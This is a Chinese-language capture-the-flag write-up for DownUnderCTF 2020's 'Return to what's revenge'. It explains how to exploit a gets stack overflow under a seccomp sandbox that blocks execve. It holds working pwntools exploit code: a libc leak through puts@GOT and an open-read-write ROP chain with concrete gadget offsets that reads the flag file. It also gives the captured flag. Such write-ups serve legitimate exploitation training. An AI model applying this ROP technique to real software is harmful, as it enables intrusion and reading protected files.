# DownUnderCTF 2020 - Return to what's revenge

## 题目简述

本题保留了 `Return to what` 的 40 字节缓冲区和 `gets` 栈溢出，但在构造函数中安装 seccomp-BPF。沙箱允许 `open`、`read`、`write` 等少量系统调用，却禁止 `execve`，因此 `system("/bin/sh")` 不再可行；需要构造 open-read-write（ORW）ROP 链直接输出 flag 文件。

## 解题过程

seccomp 白名单的关键部分为：

```c
SYSCALL(__NR_open,  ALLOW),
SYSCALL(__NR_read,  ALLOW),
SYSCALL(__NR_write, ALLOW),
SYSCALL(__NR_close, ALLOW),
KILL,
```

溢出到保存返回地址的偏移仍为 56。第一阶段与前题相同，用 `puts(puts@GOT)` 泄露 libc 地址并返回 `main`：

```python
elf = ELF("./return-to-whats-revenge", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

pop_rdi = 0x4019db
stage1 = flat(
    b"A" * 56,
    pop_rdi, elf.got["puts"],
    elf.plt["puts"], elf.sym["main"],
)
```

解析泄漏后设置 `libc.address`，再从随附 libc 中取得 `gets` 和用于控制寄存器、触发 `syscall` 的 gadget：

```python
libc.address = puts_addr - 0x0809c0
gets = libc.sym["gets"]
pop_rsi = libc.address + 0x23e6a
pop_rdx = libc.address + 0x1b96
pop_rax = libc.address + 0x439c8
syscall_ret = libc.address + 0xd2975
bss = 0x404050
```

第二阶段先调用 `gets(bss)`，把路径 `/chal/flag.txt` 写入可写内存，然后依次发起三个系统调用：

```python
stage2 = b"A" * 56 + flat(
    # gets(bss)
    pop_rdi, bss, gets,

    # open(bss, O_RDONLY) -> 3
    pop_rdi, bss,
    pop_rsi, 0,
    pop_rax, 2,
    syscall_ret,

    # read(3, bss + 0x20, 0x30)
    pop_rdi, 3,
    pop_rsi, bss + 0x20,
    pop_rdx, 0x30,
    pop_rax, 0,
    syscall_ret,

    # write(1, bss + 0x20, 0x30)
    pop_rdi, 1,
    pop_rsi, bss + 0x20,
    pop_rdx, 0x30,
    pop_rax, 1,
    syscall_ret,
)

io.sendline(stage2)
io.sendline(b"/chal/flag.txt")
```

官方链假定标准输入、输出、错误占用描述符 0、1、2，因此第一次 `open` 返回 3；在更复杂的服务中应泄露/传递 `open` 的返回值，不能无条件套用。服务输出：

```text
DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}
```

## 方法总结

遇到 seccomp 时应先枚举允许的系统调用，再决定 ROP 目标。禁止 `execve` 不代表无法读取 flag：只要 `open`、`read`、`write` 可用，就能用 ORW 链完成同样目标。本题还复用了第一阶段的 libc 泄露，以便从给定 libc 中稳定取得寄存器 gadget 和 `syscall; ret`。
